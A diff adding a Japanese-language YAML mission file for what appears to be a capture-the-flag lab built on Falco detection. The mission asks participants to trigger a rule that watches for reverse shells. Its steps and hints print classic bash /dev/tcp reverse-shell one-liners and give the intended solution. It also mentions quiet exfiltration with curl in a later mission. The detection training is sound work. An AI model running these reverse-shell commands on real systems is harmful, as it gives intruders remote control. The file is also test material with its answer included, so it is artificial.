@@ -1,0 +1,26 @@
+# Journey content for the /journey UI. Schema: internal/catalog/journey.go.
+# Participant-facing narrative only — never influences scoring.
+challengeId: 08-c2-beacon
+title: C2 ビーコン — リバースシェル
+tagline: socket を標準入出力に繋ぎ、C2 の検知を発火させろ
+briefing: >-
+  backdoor は仕込んだが「あとで再アクセス」のための reverse shell を貼っておきたい。
+  古典的な reverse shell payload は network socket fd を stdout/stderr に dup することで、
+  attacker server 側のターミナルにシェルを生やす。CTF Company の Falco は、まさにこの
+  dup 操作 (dup syscall + 宛先 fd が 0/1/2 + ipv4/ipv6 socket) を見張っている。
+  Redirect STDOUT/STDIN to Network Connection in Container を発火させれば CLEARED。
+steps:
+  - label: reverse shell の肝の syscall を知る
+    detail: socket を開き、その fd を標準入出力に dup2 する瞬間を Falco が捕まえる。
+  - label: /dev/tcp で socket を開き標準入出力に dup する
+    detail: |
+      bash -c 'exec 1<>/dev/tcp/8.8.8.8/53'
+      古典 reverse shell 形なら: bash -i >& /dev/tcp/8.8.8.8/53 0>&1
+      接続が成立する宛先が要る (TCP 53 を受ける 8.8.8.8 など)。alpine の bash は /dev/tcp を built-in で持つ。
+  - label: スコアボードで CLEARED を確認
+    detail: 発火が scoreboard に届くと、このミッションが自動で CLEARED になる。
+hints:
+  - 古典的 reverse shell は「ネットワーク socket を標準入出力に繋ぐ」ことで成立する。Falco はその繋ぐ瞬間 (dup 系 syscall) を見ている。
+  - bash の /dev/tcp/<host>/<port> で TCP socket を開き、fd リダイレクトで stdout/stdin に dup2 すると発火する。接続が成立する宛先が必要。
+  - "想定解: bash -c 'exec 1<>/dev/tcp/8.8.8.8/53' — <> が socket fd を stdout に dup する瞬間に発火。Mission 10 では逆に dup を避け curl で静かに送る。"
+docsUrl: /missions/08-c2-beacon/
